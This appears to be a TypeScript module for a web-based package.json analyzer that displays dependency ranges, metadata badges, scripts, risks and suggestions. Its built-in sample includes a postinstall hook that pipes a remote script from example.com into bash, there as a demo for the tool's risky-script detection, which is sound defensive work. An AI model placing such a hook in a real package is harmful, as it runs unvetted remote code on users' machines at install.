import { el } from '../../core/dom'
import { copyChip, download } from '../../core/ui'
import type { Tool } from '../../core/types'
import { analysePackage, groupByKind, suggestions, type PackageReport } from './package'

const SAMPLE = JSON.stringify(
  {
    name: 'example-app',
    version: '0.1.0',
    type: 'module',
    scripts: { dev: 'vite', build: 'tsc && vite build', postinstall: 'curl -s https://example.com/setup.sh | bash' },
    dependencies: { react: '^18.2.0', lodash: '~4.17.21', old: '*' },
    devDependencies: { typescript: '5.4.5', vite: 'latest' },
  },
  null,
  2,
)

function badge(label: string, present: boolean) {
  return el('span', { class: `ts-pkg-badge ${present ? 'ts-pkg-present' : 'ts-pkg-absent'}` }, `${present ? '✓' : '✕'} ${label}`)
}

const tool: Tool = {
  slug: 'package-json-analyzer',
  name: 'package.json Analyzer',
  description: 'Review dependency ranges, scripts and metadata for a package.json.',
  category: 'DevOps',
  keywords: ['npm', 'package.json', 'dependencies', 'semver', 'scripts', 'node', 'audit'],
  render(root) {
    const input = el('textarea', { class: 'ts-textarea ts-mono', rows: 16, spellcheck: false }, SAMPLE) as HTMLTextAreaElement
    const error = el('p', { class: 'ts-error', hidden: true })
    const overview = el('div', { class: 'ts-pkg-overview' })
    const riskList = el('div', { class: 'ts-pkg-risks' })
    const groups = el('div', { class: 'ts-pkg-groups' })
    const scripts = el('div', { class: 'ts-pkg-scripts' })
    const advice = el('div', { class: 'ts-pkg-advice' })
    let report = ''

    function render(current: PackageReport) {
      overview.replaceChildren()
      const heading = el('div', { class: 'ts-pkg-head' }, el('strong', {}, current.name ?? 'unnamed'), el('code', { class: 'ts-pkg-version' }, current.version ?? 'no version'))
      overview.append(
        heading,
        el('p', { class: 'ts-muted' }, `${current.counts.dependencies} dependencies · ${current.counts.devDependencies} dev · ${current.counts.peerDependencies} peer · ${current.counts.optionalDependencies} optional`),
        el(
          'div',
          { class: 'ts-row ts-wrap' },
          badge('private', current.private),
          badge('license', current.license !== null),
          badge('engines', current.metadata.engines),
          badge('repository', current.metadata.repository),
          badge('files', current.metadata.files),
          badge('types', current.metadata.types),
          badge('exports', current.metadata.exports),
          badge('packageManager', current.packageManager !== null),
        ),
      )

      riskList.replaceChildren()
      if (current.risks.length === 0) riskList.append(el('p', { class: 'ts-muted' }, 'No loose ranges or risky scripts found.'))
      for (const risk of current.risks) riskList.append(el('div', { class: 'ts-pkg-risk' }, el('span', { class: 'ts-pkg-warn' }, '!'), el('span', {}, risk)))

      groups.replaceChildren()
      for (const group of groupByKind(current.dependencies)) {
        groups.append(
          el(
            'div',
            { class: 'ts-pkg-group' },
            el('div', { class: 'ts-row ts-between' }, el('strong', {}, group.kind), el('span', { class: 'ts-muted' }, String(group.count))),
            el('code', { class: 'ts-pkg-names' }, group.names.join(', ')),
          ),
        )
      }

      scripts.replaceChildren()
      if (current.scripts.length === 0) scripts.append(el('p', { class: 'ts-muted' }, 'No scripts.'))
      for (const script of current.scripts) {
        scripts.append(
          el(
            'div',
            { class: `ts-pkg-script${script.risks.length ? ' ts-pkg-script-risky' : ''}` },
            el('div', { class: 'ts-row ts-between' }, el('code', { class: 'ts-pkg-script-name' }, script.name), script.lifecycle ? el('span', { class: 'ts-pkg-tag' }, 'lifecycle') : el('span')),
            el('code', { class: 'ts-pkg-command' }, script.command),
            ...script.risks.map((risk) => el('span', { class: 'ts-pkg-script-risk' }, risk)),
          ),
        )
      }

      advice.replaceChildren()
      const tips = suggestions(current)
      if (tips.length === 0) advice.append(el('p', { class: 'ts-muted' }, 'Nothing obvious to add.'))
      for (const suggestion of tips) advice.append(el('div', { class: `ts-pkg-tip ts-pkg-tip-${suggestion.level}` }, suggestion.message))

      report = [
        `${current.name ?? 'unnamed'} ${current.version ?? ''}`.trim(),
        `dependencies: ${current.counts.dependencies}, dev: ${current.counts.devDependencies}, peer: ${current.counts.peerDependencies}, optional: ${current.counts.optionalDependencies}`,
        '',
        'Risks:',
        ...(current.risks.length ? current.risks.map((risk) => `- ${risk}`) : ['- none']),
        '',
        'Suggestions:',
        ...tips.map((suggestion) => `- [${suggestion.level}] ${suggestion.message}`),
      ].join('\n')
    }

    function run() {
      error.hidden = true
      try {
        render(analysePackage(input.value))
      } catch (err) {
        error.textContent = err instanceof Error ? err.message : 'Could not read that package.json.'
        error.hidden = false
      }
    }

    input.addEventListener('input', run)

    root.append(
      el(
        'div',
        { class: 'ts-tool ts-tool-wide' },
        el('div', { class: 'ts-field' }, el('label', {}, 'package.json'), input),
        error,
        overview,
        el('h3', { class: 'ts-subhead' }, 'Worth a look'),
        riskList,
        el('h3', { class: 'ts-subhead' }, 'Version ranges'),
        groups,
        el('h3', { class: 'ts-subhead' }, 'Scripts'),
        scripts,
        el('h3', { class: 'ts-subhead' }, 'Suggestions'),
        advice,
        el('div', { class: 'ts-row ts-wrap' }, copyChip(() => report, 'Copy report'), el('button', { class: 'ts-button', type: 'button', onclick: () => download('package-report.txt', report) }, 'Download report')),
        el('p', { class: 'ts-note' }, 'No registry is contacted, so version ranges are judged on how they are written rather than what exists. Scripts are scanned for install hooks that fetch and run remote code.'),
      ),
    )

    run()
  },
}

export default tool
